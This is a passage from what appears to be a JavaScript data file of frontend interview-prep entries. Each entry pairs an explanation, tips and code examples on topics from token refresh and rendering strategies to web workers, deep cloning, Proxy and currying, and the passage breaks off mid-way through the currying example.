    sameSite: 'strict' // CSRF protection
  });

  // ✅ Access token in response body (stored in memory, not localStorage)
  res.json({ accessToken });
});

// Client — store in memory, not localStorage
let accessToken = null; // in-memory only

// ✅ Auto-refresh interceptor
api.interceptors.response.use(null, async (error) => {
  if (error.response?.status === 401) {
    const { data } = await axios.post('/refresh'); // uses httpOnly cookie
    accessToken = data.accessToken;
    return api(error.config); // retry original request
  }
});`
  },

  'rendering-patterns': {
    explanation: `Rendering strategies determine when and where HTML is generated.

CSR (Client-Side Rendering):
- HTML generated in browser via JS
- Slow initial load, fast subsequent navigation
- Bad for SEO (googlebot sees empty HTML)
- Best for: dashboards, apps behind login

SSR (Server-Side Rendering):
- HTML generated on server per request
- Fast first contentful paint, good SEO
- Server load scales with traffic
- Best for: dynamic pages with user-specific data

SSG (Static Site Generation):
- HTML generated at build time
- Fastest possible — served from CDN
- Best for: blogs, marketing pages, docs

ISR (Incremental Static Regeneration):
- SSG but pages regenerate in background after a time interval
- Best of SSG speed + SSR freshness`,
    tips: `TIP 1: Default to SSG for anything that doesn't change per-user. Add ISR if data changes periodically. Only use SSR when content must be real-time and user-specific.

TRAP: Using SSR for pages that are identical for all users — you're paying server cost for nothing. SSG + CDN is faster and free.

BONUS: Next.js 13+ App Router uses React Server Components by default — components render on the server and send zero JS to client, which is a fourth model beyond SSR/SSG/CSR.`,
    code: `// Next.js — choosing the right strategy

// ✅ SSG — build time, fastest (blog post)
export async function generateStaticParams() {
  const posts = await getPosts();
  return posts.map(p => ({ slug: p.slug }));
}
async function BlogPost({ params }) {
  const post = await getPost(params.slug); // runs at BUILD TIME
  return <article>{post.content}</article>;
}

// ✅ ISR — static but refreshes every 60s (product page)
async function ProductPage({ params }) {
  const product = await getProduct(params.id);
  return <div>{product.price}</div>;
}
export const revalidate = 60; // regenerate every 60 seconds

// ✅ SSR — per-request, user-specific (dashboard)
async function Dashboard() {
  const session = await getServerSession(); // runs on EVERY REQUEST
  const data = await getUserData(session.userId);
  return <Dashboard data={data} />;
}
// No revalidate = always SSR

// ✅ CSR — client only, after hydration (real-time chart)
'use client'
function LiveChart() {
  const [data, setData] = useState([]);
  useEffect(() => {
    const ws = new WebSocket('wss://api/live');
    ws.onmessage = e => setData(JSON.parse(e.data));
    return () => ws.close();
  }, []);
  return <Chart data={data} />;
}`
  },

  'virtual-dom': {
    explanation: `The Virtual DOM is a lightweight JavaScript representation of the real DOM. React uses it to minimize expensive real DOM operations.

How it works:
1. React maintains a virtual DOM tree in memory
2. When state changes, React creates a new virtual DOM tree
3. Diffing algorithm compares old vs new tree (reconciliation)
4. Only the actual differences are applied to the real DOM (patching)

Diffing assumptions (make it O(n)):
- Elements of different types produce different trees
- key prop identifies which items changed in lists

Without keys, React can't tell if a list item moved, changed, or was added — it re-renders everything.`,
    tips: `TIP 1: Keys must be stable, unique, and not index-based when items can be reordered or deleted. Using index as key causes subtle bugs with component state.

TRAP: Thinking Virtual DOM is always faster than direct DOM manipulation. For simple cases, direct DOM is faster. React's value is developer experience + predictable updates, not raw speed.

BONUS: React 18 can now bail out of rendering a subtree entirely using React.memo + server components, skipping even virtual DOM diffing.`,
    code: `// ❌ Bad keys — index causes bugs when list changes
{items.map((item, index) => (
  <TodoItem key={index} todo={item} />  // if item deleted, all below re-render
))}

// ✅ Good keys — stable unique ID
{items.map(item => (
  <TodoItem key={item.id} todo={item} />  // React tracks each item precisely
))}

// ✅ Understanding when React skips diffing
const MemoizedChild = React.memo(({ value }) => {
  console.log('rendered');  // only logs when 'value' actually changes
  return <div>{value}</div>;
});

function Parent() {
  const [count, setCount] = useState(0);
  const [name, setName] = useState('Alice');

  return (
    <>
      <button onClick={() => setCount(c => c + 1)}>Count: {count}</button>
      <MemoizedChild value={name} />  {/* doesn't re-render when count changes */}
    </>
  );
}

// ❌ Memo doesn't help here — new object reference every render
<MemoizedChild config={{ color: 'red' }} />  // new {} each time = always re-renders

// ✅ Stable reference with useMemo
const config = useMemo(() => ({ color: 'red' }), []);
<MemoizedChild config={config} />`
  },

  'code-splitting': {
    explanation: `Code splitting breaks your JavaScript bundle into smaller chunks that load on demand, dramatically improving initial load time.

Without splitting: users download ALL your JS upfront — even code for pages they never visit.

Strategies:
- Route-based splitting — most impactful, load page JS only when navigating to it
- Component-based splitting — lazy load heavy components (charts, editors, modals)
- Library splitting — separate vendor bundle for better caching

React.lazy() + Suspense: the built-in way to lazy load components. The component's code is only fetched when it's first rendered.

Prefetching: download chunks before user navigates (on hover, idle time) to eliminate perceived loading delay.`,
    tips: `TIP 1: Route-based splitting is the highest ROI — implement it first before any micro-optimizations. In Next.js it's automatic.

TRAP: Over-splitting — creating too many tiny chunks increases HTTP requests. Find the balance; components under ~30KB don't need splitting.

BONUS: Use /* webpackPrefetch: true */ magic comment to tell Webpack to prefetch a chunk during browser idle time — navigation feels instant.`,
    code: `// ✅ Route-based code splitting (React Router)
import { lazy, Suspense } from 'react';

// ❌ Static import — all loaded upfront
// import Dashboard from './Dashboard';
// import Settings from './Settings';

// ✅ Lazy imports — loaded on demand
const Dashboard = lazy(() => import('./Dashboard'));
const Settings = lazy(() => import('./Settings'));
const HeavyChart = lazy(() => import('./HeavyChart'));

function App() {
  return (
    <Suspense fallback={<PageSkeleton />}>
      <Routes>
        <Route path="/" element={<Dashboard />} />
        <Route path="/settings" element={<Settings />} />
      </Routes>
    </Suspense>
  );
}

// ✅ Prefetch on hover — feels instant
function NavLink({ to, children }) {
  const prefetch = () => import(/* webpackPrefetch: true */ \`./pages/\${to}\`);
  return (
    <Link to={to} onMouseEnter={prefetch}>
      {children}
    </Link>
  );
}

// ✅ Conditional heavy component
function DataPage() {
  const [showChart, setShowChart] = useState(false);
  return (
    <>
      <button onClick={() => setShowChart(true)}>Show Chart</button>
      {showChart && (
        <Suspense fallback={<ChartSkeleton />}>
          <HeavyChart />  {/* downloads chart library only when needed */}
        </Suspense>
      )}
    </>
  );
}`
  },
  // ── MACHINE CODING CONTENT ────────────────────────────────────────────
  'mc-debounce': {
    explanation: `Debounce delays function execution until N ms after the LAST call. Essential for search inputs, resize handlers, form validation.

Core implementation requires:
1. A timer reference (closure)
2. clearTimeout on each call
3. setTimeout that only fires if no new calls come in

Variants:
- Leading edge — fire immediately, then wait
- Trailing edge — wait, then fire (default)
- Both edges — fire immediately AND after pause`,
    tips: `TIP 1: Always implement this from scratch in interviews — interviewers want to see if you understand closures and timers.

TRAP: Forgetting that clearTimeout(undefined) is safe — no need to check if timer exists first.

BONUS: Add a cancel() method to the returned function. Show leading/trailing options. This signals you know production-grade implementations.`,
    code: `function debounce(fn, delay, { leading = false } = {}) {
  let timer;
  let called = false;

  const debounced = function (...args) {
    const context = this;

    if (leading && !called) {
      fn.apply(context, args); // fire immediately
      called = true;
    }

    clearTimeout(timer);
    timer = setTimeout(() => {
      if (!leading) fn.apply(context, args); // trailing
      called = false;
    }, delay);
  };

  debounced.cancel = () => {
    clearTimeout(timer);
    called = false;
  };

  return debounced;
}

// Usage
const search = debounce((query) => fetchResults(query), 300);
input.addEventListener('input', e => search(e.target.value));`
  },

  'mc-usefetch': {
    explanation: `A production-grade useFetch hook needs to handle: loading state, error state, data state, request cancellation (AbortController), and avoiding state updates on unmounted components.

The critical detail: always cancel the fetch on cleanup. Without this, a slow response from page A can update state after the user navigated to page B.`,
    tips: `TIP 1: Always show AbortController in the cleanup — this is what separates a junior implementation from a senior one.

TRAP: Setting state after unmount. React 18 removed the "Can't perform state update on unmounted component" warning, but it's still a logic bug.

BONUS: Add a retry count parameter, cache layer with useRef, and deduplicate concurrent requests with a Map.`,
    code: `function useFetch(url, options = {}) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    if (!url) return;
    const controller = new AbortController();
    setLoading(true);
    setError(null);

    fetch(url, { ...options, signal: controller.signal })
      .then(res => {
        if (!res.ok) throw new Error(\`HTTP \${res.status}\`);
        return res.json();
      })
      .then(data => {
        setData(data);
        setLoading(false);
      })
      .catch(err => {
        if (err.name === 'AbortError') return; // cancelled
        setError(err.message);
        setLoading(false);
      });

    return () => controller.abort(); // cleanup!
  }, [url]);

  return { data, loading, error };
}

// Usage
const { data, loading, error } = useFetch('/api/users');`
  },

  'mc-autocomplete': {
    explanation: `Autocomplete requires combining: debounced input, async data fetching, keyboard navigation (↑↓ Enter Esc), accessibility (aria-activedescendant), and click outside to close.

The hardest parts:
1. Race conditions — fast typing causes old results to overwrite new ones (fix: AbortController or check if query still matches)
2. Keyboard focus management — keeping the list accessible
3. Accessibility — screen reader announcements`,
    tips: `TIP 1: Mention race condition prevention upfront — it separates senior implementations.

TRAP: Using index as key when options change — causes incorrect highlight behavior.

BONUS: Add virtual scrolling for large option lists, grouping/categorization, and async loading state per keystroke.`,
    code: `function Autocomplete({ onSelect }) {
  const [query, setQuery] = useState('');
  const [options, setOptions] = useState([]);
  const [highlighted, setHighlighted] = useState(-1);
  const [open, setOpen] = useState(false);
  const abortRef = useRef(null);

  const fetchOptions = useMemo(() =>
    debounce(async (q) => {
      abortRef.current?.abort();
      abortRef.current = new AbortController();
      try {
        const res = await fetch(\`/api/search?q=\${q}\`,
          { signal: abortRef.current.signal });
        setOptions(await res.json());
        setOpen(true);
      } catch (e) {
        if (e.name !== 'AbortError') setOptions([]);
      }
    }, 300)
  , []);

  const handleKey = (e) => {
    if (e.key === 'ArrowDown') setHighlighted(h => Math.min(h + 1, options.length - 1));
    if (e.key === 'ArrowUp') setHighlighted(h => Math.max(h - 1, 0));
    if (e.key === 'Enter' && highlighted >= 0) {
      onSelect(options[highlighted]);
      setOpen(false);
    }
    if (e.key === 'Escape') setOpen(false);
  };

  return (
    <div role="combobox" aria-expanded={open}>
      <input value={query}
        onChange={e => { setQuery(e.target.value); fetchOptions(e.target.value); }}
        onKeyDown={handleKey} aria-autocomplete="list" />
      {open && (
        <ul role="listbox">
          {options.map((opt, i) => (
            <li key={opt.id} role="option"
              aria-selected={i === highlighted}
              style={{ background: i === highlighted ? '#1e2d40' : 'transparent' }}
              onClick={() => { onSelect(opt); setOpen(false); }}>
              {opt.label}
            </li>
          ))}
        </ul>
      )}
    </div>
  );
}`
  },

  'ji-event-loop': {
    explanation: `Event loop output questions are the #1 most common JS interview question at senior level. The key is having a systematic approach:

Step 1: Run all sync code (Call Stack)
Step 2: Drain ALL microtasks (Promise.then, queueMicrotask, async/await)
Step 3: ONE macrotask (setTimeout, setInterval)
Step 4: Repeat from step 2

async/await translates directly to Promise.then — await pauses execution and queues the rest as a microtask.`,
    tips: `TIP 1: Always say "let me trace through this step by step" — interviewers want to see your process, not just the answer.

TRAP: Forgetting that async/await is syntactic sugar for Promises — await foo() means .then(). Everything after await is a microtask.

BONUS: In Node.js, process.nextTick() runs BEFORE Promise microtasks. Mention this if interviewing for Node roles.`,
    code: `// Classic question — what's the output?
console.log('1');
setTimeout(() => console.log('2'), 0);
Promise.resolve().then(() => console.log('3'));
console.log('4');
// Answer: 1, 4, 3, 2

// Harder — async/await version
async function run() {
  console.log('A');
  await Promise.resolve();
  console.log('B'); // microtask
}
console.log('C');
run();
console.log('D');
// Answer: C, A, D, B

// Hardest — nested microtasks
Promise.resolve()
  .then(() => {
    console.log('1');
    Promise.resolve().then(() => console.log('2'));
  })
  .then(() => console.log('3'));
// Answer: 1, 2, 3
// (inner promise resolves before outer .then continues)`
  },

  'ri-rerenders': {
    explanation: `Debugging unnecessary re-renders is a core senior React skill. The systematic approach:

1. React DevTools Profiler — record interaction, see which components rendered and why
2. why-did-you-render library — logs to console exactly what prop/state changed
3. Check for: new object references, inline functions, unstable context values

Common culprits:
- Passing new object literals as props: config={{ color: 'red' }}
- Inline callbacks: onClick={() => doSomething()}
- Context value not memoized: <Ctx.Provider value={{ user, login }}>
- useSelector too broad in Redux`,
    tips: `TIP 1: React DevTools Profiler shows a flame chart. Grayed = didn't render. Colored = rendered. The "Why did this render?" section is gold.

TRAP: Adding React.memo to every component. Memo has overhead too — the comparison cost. Only add it when profiling shows it's actually needed.

BONUS: In React 18, you can use the "Timeline" tab in React DevTools to see render scheduling with Concurrent Mode.`,
    code: `// ❌ These cause child to re-render every time Parent renders:
function Parent() {
  const config = { theme: 'dark' };     // new ref each render
  const handleClick = () => submit();   // new ref each render
  const value = { user, updateUser };   // context: new ref!

  return <MemoChild config={config} onClick={handleClick} />;
}

// ✅ Stable references:
function Parent() {
  const config = useMemo(() => ({ theme: 'dark' }), []);
  const handleClick = useCallback(() => submit(), []);
  const value = useMemo(() => ({ user, updateUser }), [user]);

  return <MemoChild config={config} onClick={handleClick} />;
}

// ✅ Debug tool:
import { whyDidYouRender } from '@welldone-software/why-did-you-render';
MyComponent.whyDidYouRender = true;`
  },

  'br-tech-debt': {
    explanation: `Technical debt is inevitable — the senior engineer's job is to manage it, not eliminate it. Key frameworks:

Classify by impact:
- High risk: security vulnerabilities, scaling bottlenecks → fix immediately
- High friction: slow builds, flaky tests, complex onboarding → fix next sprint
- Low impact: style inconsistencies, minor refactors → backlog

Communicate to stakeholders:
- Translate to business impact (developer velocity, incident frequency)
- Show before/after metrics
- Pitch alongside feature work ("20% time" or explicit sprints)`,
    tips: `TIP 1: Never say "we need to rewrite everything." Say "I'd refactor module X incrementally with these measurable outcomes."

TRAP: Treating all tech debt the same. Prioritize by risk × frequency of touch. Code that's old but never touched is fine.

BONUS: Mention the Strangler Fig pattern for legacy migrations — gradually replace old system with new while keeping both running.`,
    code: `// Framework for tech debt discussion:

// 1. Measure it
const debtMetrics = {
  buildTime: '4.5 minutes', // target: <2 min
  testFlakiness: '12%',     // target: <1%
  p95ResponseTime: '800ms', // target: <200ms
  onboardingTime: '2 weeks' // too long
};

// 2. Prioritize by: risk × touchFrequency × fixCost
const priority = {
  authModule: 'HIGH',    // touched daily, security risk
  legacyTable: 'MEDIUM', // touched weekly, no security impact
  oldUtils: 'LOW',       // never touched, isolated
};

// 3. Pitch it
// "Fixing our auth module will eliminate the 3 security
//  incidents we had this quarter and cut review time by 40%.
//  I estimate 2 sprints of focused work."`
  },

  'rf-null-undefined': {
    explanation: `null and undefined are both "absence of value" but with different semantics.

undefined: declared but not assigned (JS default)
null: intentionally absent (developer explicitly set it)

Key facts:
- typeof undefined === 'undefined'
- typeof null === 'object' (historical bug, kept for compatibility)
- null == undefined → true (loose equality special case)
- null === undefined → false (strict equality)`,
    tips: `TIP 1: In interviews, null is "intentional absence" and undefined is "accidental/default absence."

TRAP: Using null as a default parameter — it counts as "provided" so default params won't trigger.

BONUS: Optional chaining (?.) and nullish coalescing (??) treat both null and undefined the same — they're "nullish" values.`,
    code: `// When each appears:
let a;              // undefined — declared, not assigned
const obj = {};
obj.missing;        // undefined — property doesn't exist
function fn() {}
fn();               // undefined — no return value

// null is always intentional:
const user = null;  // explicitly: "no user"
document.getElementById('missing'); // null (not found in DOM)

// The famous bug:
typeof null === 'object' // true (NOT 'null'!) — 30-year-old bug

// Equality:
null == undefined   // true  (special case)
null === undefined  // false

// Nullish coalescing:
null ?? 'default'      // 'default'
undefined ?? 'default' // 'default'
0 ?? 'default'         // 0 (not nullish!)`
  },
  // ── GENERATORS & ITERATORS ────────────────────────────────────────────
  'generators': {
    explanation: `Generators are functions that can pause and resume execution using the yield keyword. They implement the iterator protocol, returning objects with a next() method.

A generator function is declared with function* syntax. Each yield pauses execution and returns a value. Calling next() resumes from where it paused.

Key concepts:
- function* — generator function declaration
- yield — pause and emit a value
- yield* — delegate to another iterable
- return value — sets done:true with that value
- Generators are lazy — values computed on demand
- Perfect for infinite sequences, async flow control, custom iteration`,
    tips: `TIP 1: Generators implement the iterator protocol — they return {value, done} objects. This makes them work with for...of, spread, and destructuring.

TRAP: Calling a generator function doesn't execute it — it returns a generator object. You need to call .next() to start execution.

BONUS: async generators (async function*) combine generators with async/await for streaming async data. Used heavily in Node.js streams and React Server Components.`,
    code: `// Basic generator
function* counter(start = 0) {
  while (true) {
    yield start++;  // pauses here, returns start
  }
}
const count = counter(1);
count.next(); // { value: 1, done: false }
count.next(); // { value: 2, done: false }

// Finite generator
function* range(start, end, step = 1) {
  for (let i = start; i < end; i += step) {
    yield i;
  }
}
[...range(0, 10, 2)]; // [0, 2, 4, 6, 8]

// Custom iterable object
const range2 = {
  from: 1, to: 5,
  [Symbol.iterator]: function*() {
    for (let i = this.from; i <= this.to; i++) yield i;
  }
};
[...range2]; // [1, 2, 3, 4, 5]

// Two-way communication
function* calculator() {
  let result = 0;
  while (true) {
    const input = yield result;  // receive value via next(val)
    result += input;
  }
}
const calc = calculator();
calc.next();      // start, { value: 0 }
calc.next(5);     // { value: 5 }
calc.next(3);     // { value: 8 }`
  },

  // ── OBSERVABLES VS PROMISES ────────────────────────────────────────────
  'rxjs-basics': {
    explanation: `Promises and Observables both handle async operations but with fundamental differences:

Promise:
- Single value — resolves once
- Eager — starts executing immediately
- Not cancellable
- No retry built-in

Observable (RxJS):
- Stream of values — emits 0 to N values over time
- Lazy — only executes when subscribed
- Cancellable via unsubscribe()
- Powerful operators: map, filter, retry, debounceTime, switchMap
- Hot vs Cold: cold = new execution per subscriber, hot = shared execution

Use Promise when: one-time async op (fetch, file read)
Use Observable when: events, WebSockets, user input streams, real-time data`,
    tips: `TIP 1: switchMap is the most important RxJS operator — it cancels the previous inner observable when a new value arrives. Perfect for search-as-you-type.

TRAP: Memory leaks from not unsubscribing. Always unsubscribe in cleanup (useEffect return, ngOnDestroy). Use takeUntil or async pipe in Angular.

BONUS: Observables are the foundation of most reactive frameworks. Understanding cold vs hot observables separates intermediate from senior developers.`,
    code: `// Promise — one value, eager
const promise = fetch('/api/data'); // starts immediately
promise.then(res => res.json()).then(data => console.log(data));

// Observable — stream, lazy
import { fromEvent, interval } from 'rxjs';
import { map, filter, debounceTime, switchMap } from 'rxjs/operators';

// Search with debounce + cancel previous request
const search$ = fromEvent(input, 'input').pipe(
  map(e => e.target.value),
  debounceTime(300),
  filter(q => q.length > 2),
  switchMap(q => fetch('/api/search?q=' + q).then(r => r.json()))
  // switchMap cancels previous fetch if new input arrives!
);
const sub = search$.subscribe(results => render(results));
// Cleanup:
sub.unsubscribe(); // stops the stream

// Cold vs Hot
import { Subject, share } from 'rxjs';
const cold$ = interval(1000); // each subscriber gets own timer
const hot$  = cold$.pipe(share()); // all subscribers share one timer

// Converting Promise to Observable
import { from } from 'rxjs';
const obs$ = from(fetch('/api/data')); // wraps promise`
  },

  // ── WEB WORKERS ──────────────────────────────────────────────────────
  'web-workers': {
    explanation: `Web Workers run JavaScript in a background thread, separate from the main UI thread. This prevents heavy computations from blocking rendering and user interactions.

Types:
- Dedicated Worker — one page, one worker
- Shared Worker — multiple pages share one worker
- Service Worker — acts as network proxy, enables PWA features

Communication via postMessage() — structured clone algorithm copies data. For large data (ArrayBuffers), use transferable objects to transfer (not copy) memory.

SharedArrayBuffer allows true shared memory between threads — requires COOP/COEP security headers.`,
    tips: `TIP 1: Web Workers cannot access the DOM. They only communicate via postMessage. Design them as pure computation engines.

TRAP: Forgetting that postMessage copies data — sending a 100MB buffer copies it. Use transfer: [buffer] to transfer ownership instead of copying (zero-copy).

BONUS: Inline workers using Blob URLs avoid separate files — create the worker code as a string, make a Blob, create an ObjectURL. Works in any bundler setup.`,
    code: `// worker.js
self.onmessage = (e) => {
  const { data, type } = e.data;
  if (type === 'COMPUTE') {
    const result = heavyComputation(data);
    self.postMessage({ type: 'RESULT', result });
  }
};

// main.js
const worker = new Worker('./worker.js');
worker.postMessage({ type: 'COMPUTE', data: largeArray });
worker.onmessage = (e) => console.log(e.data.result);

// Inline worker (no separate file needed)
const code = \`self.onmessage = (e) => self.postMessage(e.data * 2);\`;
const blob = new Blob([code], { type: 'application/javascript' });
const worker2 = new Worker(URL.createObjectURL(blob));

// Transferable objects — zero copy!
const buffer = new ArrayBuffer(1024 * 1024 * 100); // 100MB
worker.postMessage({ buffer }, [buffer]); // transferred, not copied
// buffer is now detached in main thread

// SharedArrayBuffer — true shared memory
const shared = new SharedArrayBuffer(4);
const view = new Int32Array(shared);
Atomics.store(view, 0, 42);
worker.postMessage({ shared }); // same memory!`
  },

  // ── MODULE PATTERN & IIFE ──────────────────────────────────────────────
  'module-pattern': {
    explanation: `The Module Pattern uses closures to create private state and expose a public API. Before ES modules, this was the primary way to encapsulate code.

IIFE (Immediately Invoked Function Expression): function that runs immediately, creating a private scope.

Revealing Module Pattern: define everything privately, then explicitly return/reveal what should be public.

ES Modules (modern): import/export syntax with true module scoping. Static analysis allows tree shaking. Top-level await supported.`,
    tips: `TIP 1: ES Modules are now the standard. Know the module pattern for legacy code interviews but always prefer ES modules in new code.

TRAP: Circular dependencies in ES modules. If A imports B and B imports A, you get undefined values. Design your module graph as a DAG (no cycles).

BONUS: Dynamic import() returns a Promise — use for code splitting. The module is cached after first load, so repeated dynamic imports don't refetch.`,
    code: `// IIFE — immediate private scope
const counter = (function() {
  let _count = 0;  // private

  return {
    increment: () => ++_count,
    decrement: () => --_count,
    getCount:  () => _count,
  };
})(); // immediately invoked

// Revealing Module Pattern
const userModule = (function() {
  let _users = [];

  function _validate(user) { return user.name && user.email; }
  function add(user) { if (_validate(user)) _users.push(user); }
  function getAll() { return [..._users]; }

  return { add, getAll }; // only reveal public API
})();

// ES Module (modern)
// utils.js
export const add = (a, b) => a + b;
export default class Calculator { /* ... */ }

// main.js
import Calculator, { add } from './utils.js';
import * as utils from './utils.js';

// Dynamic import — code splitting
const { default: HeavyLib } = await import('./heavy.js');

// Namespace pattern (CommonJS style)
const MathUtils = {
  add: (a, b) => a + b,
  subtract: (a, b) => a - b,
};`
  },

  // ── EXECUTION CONTEXT ──────────────────────────────────────────────────
  'execution-context': {
    explanation: `Every time JavaScript runs code, it creates an Execution Context — an environment with all the information needed to execute that code.

Types:
- Global Execution Context — created once, contains window/global
- Function Execution Context — created each function call
- Eval Execution Context — rarely used

Each context has:
- Variable Environment — stores var, function declarations
- Lexical Environment — stores let, const, function scope
- this binding — depends on call type

Execution Stack (Call Stack): LIFO stack of execution contexts. When a function is called, its context is pushed. When it returns, it's popped.

Creation phase → Execution phase (hoisting happens in creation phase).`,
    tips: `TIP 1: The call stack has a size limit — deeply recursive functions cause "Maximum call stack size exceeded". Use tail recursion or iteration for deep recursion.

TRAP: Confusing the creation phase (hoisting) with the execution phase. Variables are hoisted in the creation phase but assigned in the execution phase.

BONUS: Every closure is tied to its outer execution context's lexical environment. This is why closures "remember" variables — they hold a reference to that environment object.`,
    code: `// Execution context visualization
let x = 1; // Global EC

function outer() {
  let y = 2; // outer's EC

  function inner() {
    let z = 3; // inner's EC
    console.log(x, y, z); // 1, 2, 3 — scope chain
  }
  inner(); // inner EC pushed to stack
} // inner EC popped, outer EC popped
outer();

// Call stack trace
function a() { b(); }
function b() { c(); }
function c() { console.trace(); } // shows a > b > c
a();

// Creation phase vs execution phase
console.log(foo); // undefined (created in creation phase)
console.log(bar); // ReferenceError (let — TDZ)
var foo = 'foo';  // assigned in execution phase
let bar = 'bar';

// this in execution context
function regularFn() { console.log(this); } // global/undefined
const arrowFn = () => console.log(this);    // lexical this

const obj = { fn: regularFn };
obj.fn(); // this = obj (implicit binding)
regularFn.call({ custom: true }); // this = {custom:true}`
  },

  // ── DEEP CLONING ──────────────────────────────────────────────────────
  'deep-clone': {
    explanation: `Cloning creates a copy of a value. The depth matters:

Shallow copy: top-level properties are copied, but nested objects are still references.
Deep copy: all nested objects are recursively copied — fully independent.

Methods:
- structuredClone() — modern, handles most types, no functions
- JSON.parse(JSON.stringify()) — simple but loses: functions, undefined, Date→string, Map/Set→{}, RegExp→{}
- Recursive clone — handles everything, complex to implement correctly
- Libraries: lodash cloneDeep — most complete

Gotchas: circular references, special types (Date, Map, Set, RegExp, ArrayBuffer), prototype chain, non-enumerable properties.`,
    tips: `TIP 1: Use structuredClone() for most cases in modern code. It handles circular references, typed arrays, Maps, Sets, and Dates correctly.

TRAP: JSON.parse(JSON.stringify(obj)) silently drops functions and undefined values — never use for objects with methods or undefined properties.

BONUS: Immutability patterns (Immer, spread) are often better than deep cloning — create new objects on change rather than cloning everything.`,
    code: `// Shallow copy methods
const shallow1 = { ...original };
const shallow2 = Object.assign({}, original);
const shallow3 = original; // NOT a copy — same reference!

// Problem with shallow:
const a = { nested: { value: 1 } };
const b = { ...a };
b.nested.value = 99;
console.log(a.nested.value); // 99! shared reference

// JSON method — simple but limited
const clone1 = JSON.parse(JSON.stringify(obj));
// ❌ Loses: functions, undefined, Date→string, Map/Set→{}, circular refs

// structuredClone — modern best practice
const clone2 = structuredClone(obj);
// ✅ Handles: Date, Map, Set, ArrayBuffer, circular refs
// ❌ Still no: functions, DOM nodes, class instances

// Recursive deep clone
function deepClone(value, seen = new WeakMap()) {
  if (value === null || typeof value !== 'object') return value;
  if (seen.has(value)) return seen.get(value); // handle circular refs
  if (value instanceof Date) return new Date(value);
  if (value instanceof RegExp) return new RegExp(value);
  if (value instanceof Map) return new Map([...value].map(([k,v]) => [deepClone(k,seen), deepClone(v,seen)]));
  if (value instanceof Set) return new Set([...value].map(v => deepClone(v,seen)));

  const clone = Array.isArray(value) ? [] : Object.create(Object.getPrototypeOf(value));
  seen.set(value, clone);
  for (const key of Reflect.ownKeys(value)) {
    clone[key] = deepClone(value[key], seen);
  }
  return clone;
}`
  },

  // ── PROXY & REFLECT ──────────────────────────────────────────────────
  'proxy-reflect': {
    explanation: `Proxy wraps an object and intercepts fundamental operations: get, set, has, deleteProperty, apply, construct, etc.

Reflect provides the same methods as Proxy traps but as static functions — use it inside traps to forward operations to the original object.

Use cases:
- Validation — reject invalid values
- Reactivity — Vue 3's reactivity system
- Logging/debugging
- Mocking in tests
- Default values for missing properties
- Read-only objects
- Computed/virtual properties`,
    tips: `TIP 1: Always use Reflect.set/Reflect.get inside proxy traps instead of target[key] = value — Reflect correctly handles prototype chains and returns the right boolean.

TRAP: Proxies are not transparent — instanceof checks may fail, and some built-in methods (like Array.isArray) don't work through proxies in all cases.

BONUS: Vue 3's entire reactivity system (ref, reactive) is built on Proxy. The get trap tracks dependencies, the set trap triggers updates.`,
    code: `// Validation proxy
function createValidated(target, validators) {
  return new Proxy(target, {
    set(target, key, value, receiver) {
      if (validators[key]) {
        const error = validators[key](value);
        if (error) throw new TypeError(error);
      }
      return Reflect.set(target, key, value, receiver);
    }
  });
}
const user = createValidated({}, {
  age: v => v < 0 ? 'Age cannot be negative' : null,
});
user.age = 25; // ok
user.age = -1; // throws TypeError

// Reactive (Vue 3 style)
function reactive(obj) {
  return new Proxy(obj, {
    get(target, key, receiver) {
      track(key); // record dependency
      return Reflect.get(target, key, receiver);
    },
    set(target, key, value, receiver) {
      const result = Reflect.set(target, key, value, receiver);
      trigger(key); // notify watchers
      return result;
    }
  });
}

// Default values proxy
const withDefaults = (target, defaults) => new Proxy(target, {
  get: (t, k) => k in t ? Reflect.get(t, k) : defaults[k]
});
const config = withDefaults({}, { timeout: 3000, retries: 3 });
config.timeout; // 3000 (default)`
  },

  // ── WEAK REFS ─────────────────────────────────────────────────────────
  'weak-refs': {
    explanation: `WeakMap, WeakSet, and WeakRef allow referencing objects without preventing garbage collection.

WeakMap:
- Keys must be objects (not primitives)
- Keys are weakly held — GC can collect them
- Not iterable, no size property
- Perfect for: private data attached to objects, caches keyed by DOM elements

WeakSet:
- Contains only objects
- Weakly held
- Use case: tracking which objects have been processed

WeakRef:
- Wraps an object with a weak reference
- .deref() returns the object or undefined if GC'd
- Use with FinalizationRegistry for cleanup callbacks`,
    tips: `TIP 1: Use WeakMap for attaching private data to objects. The data is automatically cleaned up when the object is GC'd — no memory leak risk.

TRAP: Never use WeakMap when you need to iterate over entries or know the size. It's intentionally non-iterable — use Map if you need those features.

BONUS: WeakRef + FinalizationRegistry is the modern way to implement object pools and caches that automatically clean up without manual reference management.`,
    code: `// WeakMap — private data pattern
const _private = new WeakMap();
class Person {
  constructor(name, ssn) {
    _private.set(this, { ssn }); // private, GC'd with instance
    this.name = name;
  }
  getSSN() { return _private.get(this).ssn; }
}
const p = new Person('Alice', '123-45-6789');
p.getSSN(); // '123-45-6789'
p.ssn;      // undefined — truly private

// WeakMap as cache (auto-cleanup)
const cache = new WeakMap();
function getExpensiveData(obj) {
  if (cache.has(obj)) return cache.get(obj);
  const result = expensiveCompute(obj);
  cache.set(obj, result); // freed when obj is GC'd
  return result;
}

// WeakSet — tracking processed items
const processed = new WeakSet();
function processOnce(item) {
  if (processed.has(item)) return;
  process(item);
  processed.add(item);
}

// WeakRef + FinalizationRegistry
const registry = new FinalizationRegistry(key => {
  console.log(key + ' was garbage collected');
});
let obj = { data: 'important' };
const ref = new WeakRef(obj);
registry.register(obj, 'myObject');
obj = null; // eligible for GC
ref.deref(); // object or undefined`
  },

  // ── CURRYING ──────────────────────────────────────────────────────────
  'currying': {
    explanation: `Currying transforms a function with multiple arguments into a sequence of functions each taking one argument.

f(a, b, c) → f(a)(b)(c)

Partial application: pre-filling some arguments to create a specialized function.

Benefits:
- Create reusable specialized functions
- Point-free programming style
- Function composition
- Delayed execution with pre-configured params

Auto-curry: using function arity (fn.length) to automatically curry any function.`,
    tips: `TIP 1: Currying and partial application are different — currying always produces unary functions. Partial application fixes some arguments but not necessarily one at a time.

TRAP: Curried functions using rest parameters have .length === 0, breaking auto-curry implementations. Always use explicit parameters.

BONUS: Function composition with compose() and pipe() are the real power of currying. pipe(f, g, h)(x) = h(g(f(x))) — data flows left to right.`,
    code: `// Manual curry
const add = a => b => a + b;
const add5 = add(5);
add5(3); // 8
add5(10); // 15

// Auto-curry utility
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args);
    }
    return function(...args2) {
